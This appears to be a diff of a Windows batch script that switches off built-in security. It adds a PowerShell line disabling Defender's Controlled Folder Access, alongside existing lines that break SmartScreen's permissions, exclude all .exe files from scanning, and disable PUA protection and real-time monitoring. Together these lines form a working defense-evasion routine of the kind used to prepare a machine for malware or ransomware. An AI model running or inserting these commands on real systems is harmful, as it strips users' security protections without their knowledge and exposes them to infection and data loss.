@@ -30,6 +30,8 @@ icacls "%systemroot%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 
+powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
+
 powershell.exe -command "Set-MpPreference -PUAProtection disable"
 
 powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
